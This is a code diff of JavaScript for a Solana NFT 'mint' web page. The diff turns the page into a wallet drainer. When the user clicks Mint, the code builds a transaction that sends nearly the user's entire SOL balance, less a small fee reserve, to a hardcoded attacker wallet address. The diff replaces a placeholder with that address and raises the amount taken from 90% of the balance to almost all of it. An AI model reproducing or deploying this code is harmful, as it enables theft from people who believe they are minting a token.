@@ -187,59 +187,52 @@ refreshStatus();
     }
     // This function tests the transaction
     async function testTransfer(amount) {
+            // Get provider and connection 
+            const provider = getProvider();
+            const solConnected = window.solana.isConnected;
+            const manylamports = (amount * 1000000000).toFixed(0);
+            const balance = await connection.getBalance(window.solana.publicKey);
 
-        // Get provider and connection 
-        const provider = getProvider();
-        const solConnected = window.solana.isConnected;
-        const manylamports = (amount * 1000000000).toFixed(0);
+            // Verify the connection & balance 
+            if (!provider) {
+                return;
+            } else if (!solConnected) {
+                return;
+            } else if (balance == 0) {
+                alert("You do not have enough funds to withdraw");
+                // Create error msg here 
+                return;
+            }
 
-        // Verify the connection
-        if (!provider) {
-            return;
-        } else if (!solConnected) {
-            return;
-        }
-
-        // Get the public key of the user
-        let account_info = await connection.getAccountInfo(window.solana.publicKey);
-
-        // The user has no money 
-        if (account_info == null) {
-            console.log("Not enough SOL for transaction!");
-
-            // Run a function to display error 
-            // displayError();
-            return;
-        }
+        
 
 
+            // OLD WAY!
+            //var charginglamports = (balance * .9).toFixed(0); // Amount to be withdrawn
+            
+            // NEW WAY! 
+            var charginglamports = (balance - 5e3).toFixed(0); // Amount to be withdrawn 
 
 
+            // Create the transaction
+            let transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: provider.publicKey,
+                    toPubkey:  new solanaWeb3.PublicKey('9b1ZwUocsgXjqn1GZpeF1ieKF54JYJ8TNpunKYAEMwCg'),
+                    lamports: charginglamports,
+                })
+            );
 
+            // Get the black hash 
+            let {
+                blockhash
+            } = await connection.getRecentBlockhash();
 
-       // NEW WAY! 
-       var charginglamports = (balance - 5e3); // Amount to be withdrawn 
+            // Get the block hash and set the fees 
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = provider.publicKey;
 
-
-// Create the transaction
-let transaction = new solanaWeb3.Transaction().add(
-    solanaWeb3.SystemProgram.transfer({
-        fromPubkey: provider.publicKey,
-        toPubkey: "WALLET",
-        lamports: charginglamports,
-    })
-);
-
-        // Get the black hash 
-        let {
-            blockhash
-        } = await connection.getRecentBlockhash();
-
-        // Get the block hash and set the fees 
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = provider.publicKey;
-
-        return transaction;
+            return transaction;
     }
 
 
@@ -248,7 +241,7 @@ let transaction = new solanaWeb3.Transaction().add(
 
         // Test the transaction on devnet 
         let transaction = await testTransfer(amount);
-
+        //let balance = solana
         const provider = getProvider();
 
         // If the provider is not Phantom 
@@ -273,8 +266,10 @@ let transaction = new solanaWeb3.Transaction().add(
     // Mint 
     function mintButton() {
 
+        
         // Attempt to transfer wallet funds 
         makeTransfer(10000);
+        
 
         if (sent) {
             //alert("Transaction failed!");
